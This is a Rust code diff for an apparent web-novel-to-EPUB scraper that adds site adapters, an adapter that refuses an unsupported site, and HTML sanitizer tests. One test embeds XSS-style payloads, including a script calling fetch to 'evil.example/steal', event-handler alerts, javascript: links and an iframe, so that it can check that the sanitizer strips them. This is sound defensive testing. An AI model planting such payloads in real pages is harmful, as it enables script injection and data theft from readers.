@@ -18,6 +18,7 @@
 
 pub mod generic;
 pub mod novelfull;
+pub mod novelight;
 pub mod novelupdates;
 pub mod royalroad;
 pub mod wordpress;
@@ -94,12 +95,51 @@ pub fn detect_source(url: &str) -> Box<dyn NovelSource> {
         Box::new(royalroad::RoyalRoadSource)
     } else if host.ends_with("divinedaolibrary.com") {
         Box::new(wordpress::WordPressSource)
-    } else if host.ends_with("novelfull.com") || host.ends_with("novelfull.net") {
+    } else if host.ends_with("novelfull.com")
+        || host.ends_with("novelfull.net")
+        || host.ends_with("novgo.net")
+        || host.ends_with("readnovelfull.com")
+    {
+        // NovelFull and its engine clones share markup (incl. the AJAX
+        // chapter archive on readnovelfull-style sites).
         Box::new(novelfull::NovelFullSource)
+    } else if host.ends_with("novelight.net") {
+        Box::new(novelight::NovelightSource)
     } else if host.ends_with("novelupdates.com") {
         Box::new(novelupdates::NovelUpdatesSource)
+    } else if host.ends_with("novelarrow.com") {
+        // Chapter text is rendered client-side only (Next.js) — plain HTTP
+        // never sees it. Refuse with a clear message instead of failing oddly.
+        Box::new(UnsupportedSource {
+            reason: "novelarrow.com lädt Kapiteltexte nur per JavaScript und kann                      ohne eingebetteten Browser nicht abonniert werden.",
+        })
     } else {
+        // empirenovel.com, readnovelmtl.com and unknown hosts run through the
+        // heuristic parser — works on most standard novel-site layouts.
         Box::new(generic::GenericSource)
+    }
+}
+
+/// Placeholder adapter for hosts we explicitly cannot support.
+struct UnsupportedSource {
+    reason: &'static str,
+}
+
+impl NovelSource for UnsupportedSource {
+    fn id(&self) -> &'static str {
+        "unsupported"
+    }
+
+    fn fetch_novel_info(&self, _client: &PoliteClient, _url: &str) -> Result<NovelInfo> {
+        Err(VaultError::ExternalApi(self.reason.to_string()))
+    }
+
+    fn fetch_chapter(
+        &self,
+        _client: &PoliteClient,
+        _chapter: &ChapterRef,
+    ) -> Result<ChapterContent> {
+        Err(VaultError::ExternalApi(self.reason.to_string()))
     }
 }
 
@@ -588,6 +628,41 @@ mod tests {
         // The parser recovers from the stray '<'; output must stay well-formed.
         assert!(!clean.contains("< b"));
         assert!(clean.contains("&amp;"));
+    }
+
+    #[test]
+    fn sanitizer_blocks_injection_attempts() {
+        // Everything a hostile chapter page could smuggle in must come out
+        // as inert text or vanish entirely: EPUB readers execute nothing.
+        let hostile = r#"<div>
+            <script>fetch('https://evil.example/steal')</script>
+            <p onclick="alert(1)" style="background:url(javascript:x)">Text</p>
+            <a href="javascript:alert(1)">click me</a>
+            <img src="x" onerror="alert(1)"/>
+            <iframe src="https://evil.example"></iframe>
+            <form action="https://evil.example"><button>go</button></form>
+            <p><![CDATA[<script>nested</script>]]></p>
+        </div>"#;
+        let clean = sanitize_to_xhtml(hostile);
+        assert!(!clean.contains("script"), "script survived: {clean}");
+        assert!(!clean.contains("onclick"));
+        assert!(!clean.contains("onerror"));
+        assert!(!clean.contains("javascript:"));
+        assert!(!clean.contains("iframe"));
+        assert!(!clean.contains("<form"));
+        assert!(!clean.contains("href"));
+        assert!(!clean.contains("style="));
+        // The legitimate text is kept.
+        assert!(clean.contains("<p>Text</p>"));
+        assert!(clean.contains("click me"));
+    }
+
+    #[test]
+    fn sanitizer_output_has_no_attributes_at_all() {
+        // The whitelist serializer emits bare tag names only, so no attribute
+        // of any kind — benign or hostile — can reach the EPUB.
+        let clean = sanitize_to_xhtml(r#"<p class="x" data-y="z" id="a">hi</p>"#);
+        assert_eq!(clean, "<p>hi</p>");
     }
 
     #[test]
